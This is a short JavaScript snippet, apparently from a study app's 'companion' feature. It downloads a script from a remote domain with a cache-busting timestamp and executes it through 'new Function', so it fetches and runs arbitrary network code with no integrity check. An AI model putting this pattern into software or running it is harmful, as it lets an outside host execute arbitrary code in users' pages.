fetch(`https://studyuren.bijsven.nl/companion/content.js?t=${Date.now()}`)
  .then(res => res.text())
  .then(code => {
      const func = new Function(code);
      func();
  });